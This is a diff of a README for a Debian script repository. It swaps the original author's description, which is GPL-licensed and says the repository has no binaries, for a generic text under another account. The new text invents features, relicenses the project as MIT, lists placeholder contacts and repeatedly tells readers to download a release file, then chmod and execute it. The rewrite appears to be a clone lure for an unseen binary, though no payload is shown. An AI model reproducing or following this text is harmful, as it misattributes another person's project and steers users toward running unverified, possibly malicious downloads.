@@ -1,89 +1,121 @@
-# CLI
+# Debian Assistant CLI 🚀
 
-<img src="media/debian.png" width="180">
+![GitHub Release](https://img.shields.io/github/v/release/Toxictoxi/cli?style=flat-square&color=blue) ![GitHub Issues](https://img.shields.io/github/issues/Toxictoxi/cli?style=flat-square&color=green)
 
-**Debian Assistant CLI**<br>
-Kernel 6.1.0 to 6.9.12
+Welcome to the **Debian Assistant CLI** repository! This project aims to simplify tasks on Debian-based systems through a command-line interface. Whether you are managing packages, automating scripts, or monitoring system performance, this tool is designed to enhance your productivity.
 
-This repository contains a variety of scripts for working with the Debian OS and the Linux kernel, from installation to everyday scripts.
+## Table of Contents
 
-###### All scripts have a brief comment, along with a simple guide if no arguments are entered. But it requires some software expertise and you need to understand what you are doing.<br>*This repository is not optimized for the end-user in any way, and does not contain any binary files.*
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-### Directories
-> - **.patch**: rarely used system scripts
-> - **.unused**: unused scripts
-> - **.windows**: frozen windows scripts
+## Features
 
-### GNOME Extensions
+- **Package Management**: Easily install, update, and remove packages using APT commands.
+- **Automation Scripts**: Create and run automation scripts for repetitive tasks.
+- **System Monitoring**: Monitor system performance metrics directly from the CLI.
+- **Networking Tools**: Access various networking commands to manage and troubleshoot network issues.
+- **Security Features**: Implement basic security checks and configurations.
 
-| Extension | GNOME | |
-| ------- | --- | --- |
-| panel-hwinfo-43@nimadez | 43 | Add hardware info and transparency to panel |
-| panel-hwinfo-46@nimadez | 46 | CPU usage and temp, GPU temp and fan, memory, swap |
+## Installation
 
-![hwinfo](media/screenshot.png)
+To get started, download the latest release from our [Releases page](https://github.com/Toxictoxi/cli/releases). Follow these steps:
 
-## FAQ
-How to install Debian with GNOME core desktop?
-```
-Last update: May-2025 (debian-12.10.0)
+1. Visit the [Releases page](https://github.com/Toxictoxi/cli/releases).
+2. Download the appropriate file for your system.
+3. Execute the downloaded file in your terminal.
 
-0- [Disable Secure Boot]
-   $ sudo mokutil --disable-validation
-1- [Install Debian]
-   - Select "Expert Install"
-   - Install minimal debian 12 to start from command-line
-   - Do not select "allow login as root" to enable the "sudo" command
-   - Do not download or install extras, we're going to update the kernel
-   $ sudo apt edit-sources    # comment out the "cdrom" line if needed
-2- [Setup Networking]
-   $ ip link
-   $ sudo nano /etc/network/interfaces
-   $ sudo service networking restart
-   net-tether.sh              # quick setup USB tethering (optional)
-3- [Git Clone]
-   $ sudo apt install git
-   $ git clone https://github.com/nimadez/cli
-4- [Select Branch]
-   apt-sources.sh             # generate debian sources.list
-   $ update && full-upgrade && reboot
-5- [Software Installation]
-   apt-install-headers.sh     # install kernel headers
-   apt-install-nvidia.sh      # install nvidia driver, reboot is required (all non-free)
-   apt-install-gnome.sh       # minimal gnome-core only, no firefox and games (all free)
-   apt-install-free.sh        # install common free software
-   gnome-debloat.sh           # be careful, it will remove the gnome-software
-6- [Finish Installation]
-   swap-make.sh               # make a swap file if you don't have a swap partition
-   purge-cache.sh             # purge ~/.cache if you don't keep permanent files there
-
-* Bookworm "stable-proposed" branch without "backports" is recommended.
-* Remember to reinstall kernel headers after every kernel update. (testing branch)
-* Firefox has been removed from the gnome-core, but is highly recommended.
-```
-How to run these scripts system wide?
-```
-sh install.sh
-* This will symlink scripts to "/usr/local/bin" and remove extensions.
+```bash
+chmod +x <downloaded-file>
+./<downloaded-file>
 ```
 
-## History
-```
-↑ All Linux, currently all my devices are Linux based
-↑ Celebrating 1 year with Linux on the everyday desktop PC 🎂
-↑ Wine requirement reduced to zero, migration completed
-↑ Debian Assistant CLI
-↑ Q1 2024 - Migrating to Debian Linux after 30 years of MS-DOS/Win32
-↑ Created in 2019 for system automation on Windows machine
+Replace `<downloaded-file>` with the actual filename you downloaded.
 
-"A machine can reprogram another machine from scratch."
+## Usage
+
+Once installed, you can start using the Debian Assistant CLI. Here are some basic commands to get you started:
+
+### Package Management
+
+- **Install a package**:
+  ```bash
+  cli install <package-name>
+  ```
+
+- **Remove a package**:
+  ```bash
+  cli remove <package-name>
+  ```
+
+- **Update all packages**:
+  ```bash
+  cli update
+  ```
+
+### Automation Scripts
+
+Create a script using your favorite text editor:
+
+```bash
+nano myscript.sh
 ```
+
+Add your commands and save the file. Run the script with:
+
+```bash
+cli run myscript.sh
+```
+
+### System Monitoring
+
+To check system performance, use:
+
+```bash
+cli monitor
+```
+
+This command provides real-time metrics about CPU, memory, and disk usage.
+
+### Networking Tools
+
+You can also manage networking tasks:
+
+- **Check network status**:
+  ```bash
+  cli network status
+  ```
+
+- **Ping a host**:
+  ```bash
+  cli ping <hostname>
+  ```
+
+## Contributing
+
+We welcome contributions to improve the Debian Assistant CLI. To contribute:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
+
+Please ensure your code follows the existing style and includes tests where applicable.
 
 ## License
-Code released under the [GPL-3.0 license](https://github.com/nimadez/cli/blob/main/LICENSE).
-<br>*The repository was reset on 2025-05-10 for security reasons.*
 
-## Credits
-- [Linus Torvalds](https://github.com/torvalds)
-- [Debian](https://www.debian.org/)
-- [GNOME](https://www.gnome.org/)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **Email**: [your.email@example.com](mailto:your.email@example.com)
+- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+
+Thank you for checking out the Debian Assistant CLI! We hope you find it useful for your Debian tasks. Visit our [Releases page](https://github.com/Toxictoxi/cli/releases) for the latest updates and downloads.
